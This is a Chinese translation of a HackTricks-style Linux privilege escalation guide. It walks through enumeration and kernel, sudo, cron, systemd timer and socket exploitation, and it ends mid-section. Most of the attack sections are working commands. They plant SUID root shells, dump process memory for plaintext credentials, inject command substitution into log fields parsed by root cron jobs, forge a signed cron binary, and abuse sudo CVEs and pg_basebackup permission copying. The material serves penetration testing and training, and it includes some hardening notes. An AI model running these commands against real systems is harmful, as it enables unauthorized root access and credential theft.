# Linux 权限提升

{{#include ../../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们先开始了解正在运行的操作系统
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你对 `PATH` 变量中的任何文件夹具有**写入权限**，则可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或 API keys？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，并确认是否存在可用于提升权限的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的 vulnerable kernel 列表以及一些已经 **compiled exploits**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
其他可以找到一些 **compiled exploits** 的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有 vulnerable kernel 版本，可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用于搜索 kernel exploits 的工具包括：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者机器中执行，仅检查针对 kernel 2.x 的 exploits）

始终**在 Google 中搜索 kernel version**，因为你的 kernel version 可能会出现在某个 kernel exploit 中，这样你就能确定该 exploit 有效。

其他 kernel exploitation techniques：

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

根据以下内容中出现的存在漏洞的 sudo 版本：
```bash
searchsploit sudo
```
可以使用以下 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许未授权的本地用户通过 sudo 的 `--chroot` 选项将权限提升至 root，前提是 `/etc/nsswitch.conf` 文件来自用户可控目录。

这里有一个用于利用该[漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)的 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)。运行 exploit 之前，请确保你的 `sudo` 版本存在漏洞，并且支持 `chroot` 功能。

更多信息请参阅原始的[漏洞公告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo 基于主机的规则绕过（CVE-2025-32462）

1.9.17p1 之前的 Sudo（报告的受影响版本范围：**1.8.8–1.9.17**）可能会使用 `sudo -h <host>` 提供的**用户指定主机名**来评估基于主机的 sudoers 规则，而不是使用**真实主机名**。如果 sudoers 在另一台主机上授予了更宽泛的权限，你就可以在本地**伪造**该主机。

要求：
- 存在漏洞的 sudo 版本
- 特定于主机的 sudoers 规则（主机既不是当前主机名，也不是 `ALL`）

sudoers 规则示例：
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
通过 spoofing 允许的主机进行 Exploit：
```bash
sudo -h devbox id
sudo -h devbox -i
```
如果 spoofed name 的解析被阻塞，请将其添加到 `/etc/hosts`，或使用日志/配置中已经出现的 hostname，以避免 DNS 查询。

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **HTB 的 smasher2 box**，了解如何利用此漏洞的一个**示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## 容器逃逸

如果你位于容器内部，请先从以下 container-security 部分开始，然后再转向针对具体 runtime 的滥用页面：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## 驱动器

检查**挂载和卸载了什么**、挂载或卸载的位置以及原因。如果有任何内容处于卸载状态，可以尝试将其挂载，然后检查其中是否包含私密信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了**任何编译器**。如果你需要使用某个 kernel exploit，这会很有用，因为建议在你将要使用它的机器上（或一台类似的机器上）对其进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许存在某个旧版本的 Nagios（例如），可以利用它来提升权限……\
建议手动检查较可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你拥有该机器的 SSH 访问权限，也可以使用 **openVAS** 检查机器中安装的软件是否过时且存在漏洞。

> [!NOTE] > _请注意，这些命令会显示大量信息，其中大部分通常没有用。因此，建议使用 OpenVAS 或类似的应用程序来检查已安装的软件版本是否容易受到已知 exploits 的攻击_

## 进程

查看正在执行的**进程**，并检查是否有进程拥有**不应有的更高权限**（例如，某个 tomcat 是否由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有正在运行的 [**electron/cef/chromium debuggers**，你可以滥用它来提升权限](../../software-information/electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些调试器。\
还要**检查你对进程二进制文件的权限**，也许你可以覆盖它们。

### 跨用户父子进程链

由与父进程**不同用户**运行的子进程并不一定是恶意的，但这是一个有用的**初步排查信号**。某些用户切换是正常的（例如 `root` 启动 service user、login managers 创建 session processes），但异常的进程链可能暴露 wrappers、debug helpers、persistence 或薄弱的 runtime trust boundaries。

快速检查：
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
如果你发现了一条令人意外的链路，请检查父进程的命令行，以及所有会影响其行为的文件（`config`、`EnvironmentFile`、辅助脚本、工作目录、可写参数）。在多个真实的 privesc 路径中，子进程本身不可写，但**由父进程控制的 config**或辅助链是可写的。

### 已删除的可执行文件和已删除但仍打开的文件

运行时工件在**删除后**通常仍可访问。这对于 privilege escalation，以及从已经打开敏感文件的进程中恢复证据，都很有用。

检查已删除的可执行文件：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
如果 `/proc/<PID>/exe` 指向 `(deleted)`，则该进程仍在运行内存中的旧二进制映像。这是一个需要重点调查的强烈信号，因为：

- 被移除的可执行文件可能包含有价值的字符串或凭据
- 正在运行的进程可能仍暴露有用的文件描述符
- 被删除的特权二进制文件可能表明近期发生过篡改或清理尝试

全局收集 deleted-open 文件：
```bash
lsof +L1
```
如果发现了有趣的描述符，直接恢复它：
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
当一个进程仍然打开着已删除的 secret、script、database export 或 flag file 时，这一点尤其有价值。

### Process monitoring

你可以使用 [**pspy**](https://github.com/DominicBreuker/pspy) 等工具来监控进程。这对于识别频繁执行的 vulnerable processes，或在满足一组 requirements 时执行的进程，非常有用。

### Process memory

某些服务器服务会在**内存中以明文保存 credentials**。\
通常，你需要 **root privileges** 才能读取属于其他用户的进程内存，因此当你已经是 root 并希望发现更多 credentials 时，这通常更有用。\
不过请记住，**作为普通用户，你可以读取自己拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器**默认不允许 ptrace**，这意味着你无法 dump 属于你的 unprivileged user 的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：所有进程都可以被 debug，只要它们具有相同的 uid。这是 ptracing 的经典工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有 parent process 可以被 debug。
> - **kernel.yama.ptrace_scope = 2**：只有 admin 可以使用 ptrace，因为这需要 CAP_SYS_PTRACE capability。
> - **kernel.yama.ptrace_scope = 3**：任何进程都不能通过 ptrace 被 trace。设置后，需要 reboot 才能重新启用 ptracing。

#### GDB

如果你可以访问某个 FTP service 的内存（例如），就可以获取其 Heap 并在其中搜索 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示内存如何映射到该进程的**虚拟地址空间中；它还显示**每个映射区域的权限**。**mem** 伪文件**暴露进程本身的内存**。通过 **maps** 文件，我们可以知道哪些**内存区域可读**以及它们的偏移量。利用这些信息，我们可以 **seek 到 mem 文件中的相应位置，并将所有可读区域 dump** 到文件中。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，只有 **root** 用户和 **kmem** 组可读取 `/dev/mem`。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump 是经典 ProcDump 工具的 Linux 重制版，该工具来自 Windows 的 Sysinternals 工具套件。可从 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求，并转储由你拥有的进程
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root）

### 从进程内存中获取凭据

#### 手动示例

如果你发现认证器进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 进程（请参阅前面的章节，了解转储进程内存的不同方法），然后在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将从**内存**和一些**知名文件**中**窃取明文凭据**。要正常运行，该工具需要 root 权限。

| 功能                                             | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM 密码（Kali Desktop、Debian Desktop）          | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（活动 FTP 连接）                           | vsftpd               |
| Apache2（活动 HTTP Basic Auth 会话）              | apache2              |
| OpenSSH（活动 SSH 会话 - Sudo 使用）              | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时/Cron 任务

### 以 root 身份运行的 Crontab UI (alseambusher) —— 基于 Web 的 scheduler privesc

如果 Web “Crontab UI”面板 (alseambusher/crontab-ui) 以 root 身份运行，且仅绑定到 loopback，仍然可以通过 SSH 本地端口转发访问它，并创建一个具有特权的任务来完成提权。

典型链路
- 通过 `ss -ntlp` / `curl -v localhost:8000` 发现仅限 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm
- 在运行相关的文件中查找凭据：
- 使用 `zip -P <password>` 的备份/脚本
- 暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` 的 systemd unit
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行（生成 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并限制为最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免将 secrets 嵌入 unit files；使用 secret stores 或仅 root 可读的 EnvironmentFile
- 为按需执行的 jobs 启用 audit/logging



检查是否有 scheduled job 存在漏洞。也许你可以利用某个由 root 执行的 script（wildcard vuln？可以修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
如果使用了 `run-parts`，请检查哪些名称实际上会被执行：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
这可以避免误报。只有当你的 payload 文件名符合本地 `run-parts` 规则时，可写的周期性目录才有用。

### Cron 路径

例如，在 _/etc/crontab_ 中可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意，用户 "user" 对 /home/user 具有写入权限_）

如果在此 crontab 中，root 用户尝试执行某个命令或脚本，但未设置路径。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获取 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 使用通配符的 Cron 脚本（Wildcard Injection）

如果 root 执行的脚本在命令中包含“**\***”，你可以利用这一点来执行非预期操作（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面带有路径，例如** _**/some/path/\***_ **，则不存在漏洞（即使是** _**./\***_ **也不行）。**

阅读以下页面，了解更多 wildcard exploitation 技巧：


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 `((...))`、`$((...))` 和 `let` 中进行算术求值之前，会先执行 parameter expansion 和 command substitution。如果 root 运行的 cron/parser 读取不受信任的日志字段，并将其传入 arithmetic context，攻击者就可以注入 command substitution `$(...)`，在 cron 运行时以 root 身份执行命令。

- 原理：在 Bash 中，expansion 按以下顺序执行：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。因此，像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（执行其中的命令），然后剩余的数字 `0` 被用于 arithmetic，使脚本能够无错误地继续运行。

- 典型的易受攻击模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation：将攻击者控制的文本写入被解析的日志，使数值字段包含 command substitution，并以数字结尾。确保你的命令不会向 stdout 输出内容（或将其重定向），这样 arithmetic 才能保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你**可以修改由 root 执行的 cron script**，就可以非常轻松地获得 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个**你拥有完全访问权限的目录**，删除该目录并**创建一个指向其他目录的 symlink 文件夹**可能会很有用，从而提供一个由你控制的脚本
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink 验证与更安全的文件处理

审查按路径读取或写入文件的 privileged scripts/binaries 时，验证其如何处理 links：

- `stat()` 会跟随 symlink 并返回目标的元数据。
- `lstat()` 返回 link 本身的元数据。
- `readlink -f` 和 `namei -l` 有助于解析最终目标，并显示每个路径组件的权限。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
对于 defenders/developers，更安全的防御 symlink tricks 模式包括：

- `O_EXCL` 与 `O_CREAT`：如果路径已存在则失败（阻止攻击者预先创建 links/files）。
- `openat()`：相对于受信任的目录文件描述符进行操作。
- `mkstemp()`：使用安全权限以原子方式创建临时文件。

### 带有可写 payload 的自定义签名 cron binaries

Blue teams 有时会通过导出自定义 ELF section，并在以 root 执行它们之前使用 grep 检查 vendor string，来“签名”由 cron 驱动的 binaries。如果该 binary 对 group 可写（例如，`/opt/AV/periodic-checks/monitor` 的所有者为 `root:devs 770`），并且你可以 leak signing material，就可以伪造该 section 并劫持 cron task：

1. 使用 `pspy` 捕获 verification flow。在 Era 中，root 执行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后执行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用 leaked key/config（来自 `signing.zip`）重新创建预期的 certificate：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建 malicious replacement（例如，放置一个 SUID bash、添加你的 SSH key），并将 certificate 嵌入 `.text_sig`，使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留 execute bits 的同时覆盖 scheduled binary：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron run；一旦 naive signature check 成功，你的 payload 就会以 root 身份运行。

### Frequent cron jobs

你可以监控 processes，以查找每隔 1、2 或 5 分钟执行的 processes。也许你可以利用它来提升 privileges。

例如，要**每 0.1 秒监控 1 分钟**、**按执行次数较少的 commands 排序**，并删除执行次数最多的 commands，可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监控并列出每个启动的进程）。

### 保留攻击者设置的 mode bits 的 root 备份（pg_basebackup）

如果 root-owned cron 针对你可以写入的数据库目录运行 `pg_basebackup`（或任何递归复制操作），你可以植入一个 **SUID/SGID binary**，该文件会以 **root:root** 身份、保留相同的 mode bits，被重新复制到备份输出目录中。

典型的发现流程（以低权限 DB user 身份）：
- 使用 `pspy` 发现 root cron 每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认源 cluster（例如 `/var/lib/postgresql/14/main`）对你可写，并且任务执行后目标目录（`/opt/backups/current`）会归 root 所有。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
之所以可行，是因为 `pg_basebackup` 在复制集群时会保留文件模式位；由 root 调用时，目标文件会继承 **root 所有权 + 攻击者选择的 SUID/SGID**。任何类似的特权备份/复制例程，只要保留权限并将文件写入可执行位置，就存在漏洞。

### 隐形 cron jobs

可以创建一个 cronjob：**在注释后放置回车符**（不带换行符），这样 cron job 仍然可以正常运行。示例（注意其中的回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
要检测这类隐蔽入口，请使用能够显示控制字符的工具检查 cron 文件：
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件；如果可以，你**可能会修改它**，使其在服务**启动**、**重启**或**停止**时**执行**你的 **backdoor**（可能需要等到机器重启）。\
例如，在 .service 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service binaries

请记住，如果你对服务所执行的 **binaries** 具有**写权限**，就可以将其修改为 backdoor，这样当服务被重新执行时，backdoor 就会被执行。

### systemd PATH - Relative Paths

你可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果发现你可以对路径中的任何文件夹进行**写入**，那么你可能能够**提升权限**。你需要在服务配置文件中搜索类似以下内容的**相对路径**：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写入的 systemd PATH 文件夹中创建一个与相对路径 binary **同名**的**可执行文件**；当要求该 service 执行存在漏洞的操作（**Start**、**Stop**、**Reload**）时，你的 **backdoor 将被执行**（非特权用户通常无法启动/停止 services，但请检查是否可以使用 `sudo -l`）。

**使用 `man systemd.service` 了解更多关于 services 的信息。**

## **Timers**

**Timers** 是名称以 `**.timer**` 结尾的 systemd unit files，用于控制 `**.service**` files 或 events。**Timers** 可作为 cron 的替代方案，因为它们内置支持 calendar time events 和 monotonic time events，并且可以异步运行。

你可以使用以下命令枚举所有 timers：
```bash
systemctl list-timers --all
```
### 可写入的 timers

如果你可以修改一个 timer，就可以让它执行某些 systemd.unit（例如 `.service` 或 `.target`）。
```bash
Unit=backdoor.service
```
在文档中，你可以了解到 Unit 是什么：

> 当此 timer 到期时要激活的 unit。该参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，则此值默认为与 timer unit 同名但不包含后缀的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的名称完全相同，仅后缀不同。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），该 unit **正在执行一个可写的二进制文件**
- 找到某个 systemd unit，该 unit **正在执行相对路径**，并且你对 **systemd PATH** 具有**可写权限**（以冒充该可执行文件）

**通过 `man systemd.timer` 了解有关 timer 的更多信息。**

### **启用 Timer**

要启用一个 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
请注意，通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建符号链接，**timer** 才会被**激活**。

## Sockets

Unix Domain Sockets (UDS) 支持同一台或不同机器上的**进程通信**，并采用客户端-服务器模型。它们使用标准 Unix descriptor 文件进行计算机间通信，并通过 `.socket` 文件进行设置。

可以使用 `.socket` 文件配置 Sockets。

**通过 `man systemd.socket` 了解更多关于 Sockets 的信息。** 在该文件中，可以配置以下几个有趣的参数：

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项各不相同，但其作用概括来说是**指示 Socket 将在哪里监听**（AF_UNIX Socket 文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`：接受一个布尔值参数。如果为 **true**，则会为**每个传入连接生成一个 service instance**，并且只将连接 Socket 传递给它。如果为 **false**，则所有监听 Socket 本身都会**传递给已启动的 service unit**，并且所有连接只会生成一个 service unit。对于 datagram Sockets 和 FIFO，此值会被忽略，因为单个 service unit 会无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适用于 `Accept=no` 的方式编写新的 daemon。
- `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，分别在监听 **Sockets**/FIFO 被**创建**并绑定**之前**或**之后**执行。命令行的第一个 token 必须是绝对文件名，后面跟随进程参数。
- `ExecStopPre`、`ExecStopPost`：分别在监听 **Sockets**/FIFO 被**关闭**并移除**之前**或**之后**执行的其他**命令**。
- `Service`：指定在有**传入流量**时要**激活**的 **service unit** 名称。此设置仅允许用于 `Accept=no` 的 Sockets。默认情况下，它使用与 Socket 同名的 service（替换后缀）。在大多数情况下，不需要使用此选项。

### Writable .socket files

如果发现一个**可写**的 `.socket` 文件，可以在 `[Socket]` section 的开头添加类似以下内容：`ExecStartPre=/home/kali/sys/backdoor`，这样 backdoor 就会在 Socket 创建之前执行。因此，你**可能需要等待机器重启。**\
_请注意，系统必须正在使用该 Socket 文件配置，否则 backdoor 不会执行_

### Socket activation + writable unit path (create missing service)

另一个影响很大的错误配置是：

- 一个 `Accept=no` 且包含 `Service=<name>.service` 的 Socket unit
- 被引用的 service unit 不存在
- attacker 可以写入 `/etc/systemd/system`（或其他 unit search path）

在这种情况下，attacker 可以创建 `<name>.service`，然后向该 Socket 触发流量，使 systemd 以 root 身份加载并执行新的 service。

快速流程：
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 可写套接字

如果你**识别出任何可写套接字**（_这里讨论的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你就可以与该套接字通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
